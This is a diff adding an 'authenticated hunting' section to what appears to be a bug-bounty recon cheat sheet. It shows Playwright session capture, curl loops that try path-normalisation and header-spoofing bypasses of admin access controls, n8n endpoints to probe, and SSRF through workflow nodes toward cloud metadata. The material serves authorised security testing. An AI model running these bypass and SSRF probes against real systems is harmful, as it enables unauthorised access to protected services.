@@ -372,3 +372,37 @@ Use only where you are authorized.*
 - **Prototype pollution → XSS gadget:** pollute `__proto__.<sink>` then trigger a
   library gadget (jQuery `$.extend`, Lodash `_.merge`, `Object.assign` on
   attacker JSON). Confirm with `Object.prototype.polluted` in console.
+
+---
+
+## Authenticated hunting & n8n/low-code recipes (2020–2026) — v4.5
+
+> Generalised from an authorised n8n/Next.js engagement. The scanner now carries
+> your session (`--cookie` / `--auth-state` / `--header`); these are the manual
+> follow-ups that turned recon into findings.
+
+### Replay a browser session
+```bash
+# capture once with Playwright, then feed storageState to the scanner:
+node -e "const{chromium}=require('playwright');(async()=>{const b=await chromium.launch({headless:false});const c=await b.newContext();const p=await c.newPage();await p.goto('https://target/login');console.log('log in, then press enter');process.stdin.once('data',async()=>{await c.storageState({path:'auth.json'});await b.close()})})()"
+python3 bounty_recon.py -t target.com --profile safe --auth-state auth.json
+```
+
+### Access-control bypass (what `--access-bypass` automates — verify by hand)
+```bash
+# path normalisation (edge-vs-origin parser differential)
+for v in '/%2e/admin' '/admin/..;/' '//admin' '/admin%2f' '/;/admin'; do
+  printf '%s -> ' "$v"; curl -sk -o /dev/null -w "%{http_code}\n" "https://target$v"; done
+# trusted-proxy header spoof
+curl -sk -o /dev/null -w "%{http_code}\n" -H 'X-Forwarded-For: 127.0.0.1' 'https://target/admin'
+curl -sk -o /dev/null -w "%{http_code}\n" -H 'X-Original-URL: /admin' 'https://target/'
+```
+
+### n8n / low-code platforms
+- `/rest/settings` — unauth bootstrap (auth method, SSO, SMTP, versions).
+- `/webhook/*` vs `/webhook-test/*` — prod vs test webhooks; path-normalisation
+  (`/%2ewebhook/`) sometimes bypasses an edge block → reaches the origin.
+- `/healthz`, `/metrics`, `/admin/metrics` on sibling services (orchestrator,
+  tool-gateway) — frequently cluster-internal only; test from each vantage.
+- SSRF via workflow HTTP-request nodes / webhook responders → internal services
+  and cloud metadata. Confirm out-of-band (interactsh).
